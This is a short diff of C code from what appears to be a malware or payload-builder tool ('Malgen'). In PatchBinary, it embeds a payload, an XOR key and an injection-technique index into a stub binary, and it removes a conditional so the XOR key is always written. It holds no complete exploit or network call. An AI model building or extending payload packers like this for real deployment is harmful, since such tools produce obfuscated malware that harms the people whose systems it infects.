@@ -95,11 +95,7 @@ BOOL PatchBinary(const MalgenConfig* config, LPVOID payload, SIZE_T payload_size
 
     *(DWORD*)(stub_data + marker_offset) = (DWORD)payload_size;
     memcpy(stub_data + marker_offset + sizeof(DWORD), payload, payload_size);
-
-    if (config->encryption == ENCRYPTION_XOR) {
-        *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = config->xor_key;
-    }
-
+    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = config->xor_key;
     *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1) = GetTechniqueIndex(config->injection);
 
     memcpy(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
